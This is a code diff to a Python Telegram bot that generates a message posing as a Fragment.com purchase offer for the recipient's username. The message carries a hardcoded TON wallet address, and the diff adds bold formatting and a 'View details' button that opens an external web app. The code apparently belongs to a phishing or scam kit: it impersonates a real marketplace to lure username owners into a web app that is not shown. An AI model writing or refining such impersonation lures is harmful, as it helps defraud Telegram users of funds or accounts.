@@ -70,7 +70,7 @@ def generate_fragment_message(username, ton_amount):
         # Adresse wallet
         wallet_address = "UQBBlxK8VBxEidbxw4oQVyLSk7iEf9VPJxetaRQpEbi-XDPR"
         
-        # Message Fragment - Version simplifiée pour éviter les erreurs
+        # Message Fragment
         fragment_message = f"""We have received a purchase request for your username @{username} via Fragment.com. Below are the transaction details:
 
 • Offer Amount: 💎{price:g} (${price_usd:.2f} USD)
@@ -89,11 +89,34 @@ Important:
 
         print(f"🔧 DEBUG: Message généré, longueur: {len(fragment_message)}")
         
-        # Pas d'entités pour le moment - simplifié
-        entities = []
+        # Entités de formatage  
+        entities = [
+            MessageEntity(
+                type=MessageEntity.BOLD, 
+                offset=fragment_message.find("• Offer Amount:"), 
+                length=15
+            ),
+            MessageEntity(
+                type=MessageEntity.BOLD, 
+                offset=fragment_message.find("• Commission:"), 
+                length=13
+            ),
+            MessageEntity(
+                type=MessageEntity.BOLD, 
+                offset=fragment_message.find("Additional Information:"), 
+                length=23
+            ),
+            MessageEntity(
+                type=MessageEntity.BOLD, 
+                offset=fragment_message.find("Important:"), 
+                length=10
+            )
+        ]
         
-        # Pas de clavier pour le moment - simplifié  
-        keyboard = None
+        # Bouton "View details" - exactement comme dans le code original
+        keyboard = InlineKeyboardMarkup([
+            [InlineKeyboardButton("View details", web_app=WebAppInfo(url=WEBAPP_URL))]
+        ])
         
         print(f"✅ DEBUG: Message Fragment généré avec succès pour {username}")
         return fragment_message, entities, keyboard
